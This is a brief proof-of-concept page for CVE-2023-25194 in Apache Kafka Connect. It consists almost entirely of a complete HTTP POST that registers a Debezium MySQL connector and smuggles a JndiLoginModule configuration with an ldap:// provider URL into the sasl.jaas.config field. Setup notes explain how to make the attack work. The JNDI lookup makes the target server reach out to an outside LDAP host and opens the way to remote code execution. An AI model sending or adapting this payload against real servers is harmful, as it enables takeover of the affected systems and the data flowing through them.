# CVE-2023-25194

https://hackerone.com/reports/1529790

## Poc

```
POST /connectors HTTP/1.1
Host: xxxx:8083
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/json
Connection: close
Content-Length: 1109

{"name": "test", 
   "config":
    {
        "connector.class":"io.debezium.connector.mysql.MySqlConnector",
    	"database.hostname": "xxxxx",
    	"database.port": "3306",
    	"database.user": "root",
    	"database.password": "xxxxxx",
    	"database.dbname": "xxxx",
    	"database.sslmode": "SSL_MODE",
        "database.server.id": "1234",
    	"database.server.name": "localhost",
        "table.include.list": "MYSQL_TABLES",
    	"tasks.max":"1",
        "topic.prefix": "aaa22",
        "debezium.source.database.history": "io.debezium.relational.history.MemoryDatabaseHistory",
        "schema.history.internal.kafka.topic": "aaa22",
        "schema.history.internal.kafka.bootstrap.servers": "kafka:9202",
    	"database.history.producer.security.protocol": "SASL_SSL",
    	"database.history.producer.sasl.mechanism": "PLAIN",
    	"database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://aaa\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
    }
}
```

## Attension

1. Import the libs by copy them to the kafka's libs directory.
2. Kafka Connect must be running. (./bin/connect-distributed.sh config/connect-distributed.properties)
3. mysql info must be right, and make sure kafka connect can connect the db.
